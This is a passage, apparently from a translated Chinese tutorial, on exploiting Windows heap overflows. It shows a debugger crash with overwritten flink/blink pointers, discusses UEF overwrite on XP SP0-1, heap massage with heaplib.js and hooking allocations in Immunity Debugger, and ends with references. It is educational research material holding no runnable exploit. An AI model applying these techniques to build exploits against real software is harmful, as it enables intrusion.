![](http://drops.javaweb.org/uploads/images/de00dd2eb4076314b088884ff431a74c42fa6076.jpg)

```
(384c.16e0): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=41414141 ebx=02270000 ecx=02273f28 edx=02270178 esi=02273f20 edi=41414141
eip=7c9111de esp=0013e544 ebp=0013e764 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
ntdll!RtlAllocateHeap+0x567:
7c9111de 8b10            mov     edx,dword ptr [eax]  ds:0023:41414141=????????

```

太棒了，所以我们有了一个潜在的攻击利用条件。在这种情况下，flink就是EAX然后blink就是EDI.带XP sp 0-1和以下版本，我们可以简单地实行一次简单的UEF函数覆写并且获取控制。但是我们已经能够通过浏览器强大的脚本能力给堆"按摩（原文massage，但我总觉得像是message，呵呵）"这样我们将会试着在xp sp3下对付这个漏洞。在分析堆的布局时，我快速地注意到Active X control实际上在运行时创建了它自己的堆并且crash是在freelist insert时被触发的

![](http://drops.javaweb.org/uploads/images/7d70c88cc6187398b0328e177a0d5ad9133447bb.jpg)

当使用heaplib.js库时，我可以成功地操作堆，那就是说，默认的进程堆**不是**active X controls的堆。在这一点上，我大致可以说在Windows XP SP3及以上版本_看上去_不能利用，当然这可能是糟糕的误解但是就目前我可以说，如果对象的堆无法被操作，那么它就不能被利用。

**Hooking 钩子：**

一个非常有用的提示是 知道当调试具有堆溢出的程序时调的是分配与free的数量以及它们的大小。在一个进程/线程的生命周期里，许多分配与free被执行并且确实对它们都下断点非常耗时。一件对immunity debugger不错的事情是你可以使用!hookheap插件来hook RtlAllocateHeap() 和 RtlFreeHeap()并且这样你就可以找到所有在特定操作中执行的 分配和free 的大小和数量

![](http://drops.javaweb.org/uploads/images/06f56431b98597e64f76671aa30d2e7ce43ece74.jpg)

正如你所见，一个特别的分配露了出来，一次大量字节的分配看上去像是对目标漏洞服务器的请求。

0x07 结语
-------

* * *

堆管理器对于去理解、去利用堆溢出非常复杂 因为每个情况都有不同所以需要许多小时的分析。理解目标程序的当前上下文环境以及其中的限制是发掘一个堆溢出可利用性的关键。被微软强制的mitigation保护 基础地防护了大多数的堆溢出，不过时不时地我们看到特定程序条件被攻击者利用的情况发生

References:

1.  http://windbg.info/doc/1-common-cmds.html
2.  http://www.insomniasec.com/publications/Heaps_About_Heaps.ppt
3.  http://cybertech.net/~sh0ksh0k/projects/winheap/XPSP2 Heap Exploitation.ppt
4.  some small aspects from: http://illmatics.com/Understanding_the_LFH.pdf
5.  http://www.blackhat.com/presentations/win-usa-04/bh-win-04-litchfield/bh-win-04-litchfield.ppt
6.  http://www.insomniasec.com/publications/Exploiting_Freelist[0]_On_XPSP2.zip
7.  http://www.insomniasec.com/publications/DEPinDepth.ppt (heap segment information)
8.  Advanced windows Debugging (Mario Hewardt)
9.  www.ptsecurity.com/download/defeating-xpsp2-heap-protection.pdf
10.  http://grey-corner.blogspot.com/2010/12/introducing-vulnserver.html
11.  http://www.immunityinc.com/downloads/immunity_win32_exploitation.final2.ppt
12.  Understanding and bypassing Windows Heap Protection by Nicolas Waisman (2007)
13.  http://kkamagui.springnote.com/pages/1350732/attachments/579350